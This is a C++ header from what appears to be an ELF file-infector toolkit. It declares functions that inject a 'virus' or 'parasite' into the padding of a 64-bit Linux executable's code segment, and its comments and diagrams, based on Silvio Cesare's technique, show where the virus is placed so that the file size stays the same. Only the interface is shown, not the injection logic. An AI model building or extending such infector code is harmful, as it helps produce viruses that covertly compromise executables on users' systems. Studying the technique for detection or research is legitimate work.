#pragma once
#include "common/mmap.hh"
#include <utility>

namespace vt::infector {
// This algorithm injects a parasite into an 64 bit elf's code segment padding,
// based on the paper publish by Silvio Cesare:
// https://vxug.fakedoma.in/archive/VxHeaven/lib/vsc01.html
//
//  host elf file structure       infected elf file structure
//  -------------------           -----------------------
//  elf_hdr                       elf_hdr
//  phdrs                         phdrs
//  executable_sections           executable_sections
//  padding                       padding             <- virus inserted here
//  non-exec sections             non-exec sections
//  shdrs                         shdrs
//
//
// Because the sections in file has the same padding, inserting virus doesn't
// change file size.
//
//  infected elf segments
//  -------------------
//  LOAD RX
//    Ehdr                      --
//    phdrs                      |     executable segment
//    interp                     |
//    PADDING    <- virus here  --
//  LOAD RW
//    .data                     --
//    ...                        |     ajacent non-executable segment
//    ...                       --
bool padding_infect64(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                      common::Mmap<PROT_READ> parasite_mapping);

struct PaddingInfect {
  // The output binary size of this algorithm.
  // @param host_size Host binary size.
  // @param parasite_size Parasite program size.
  static size_t output_size(size_t host_size, size_t parasite_size) {
    // The text padding injection algorithm does'n change the host size.
    (void)parasite_size;
    return host_size;
  }
  bool operator()(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                  common::Mmap<PROT_READ> parasite_mapping) {
    return padding_infect64(std::move(host_mapping), std::move(parasite_mapping));
  }
};

}  // namespace vt::infector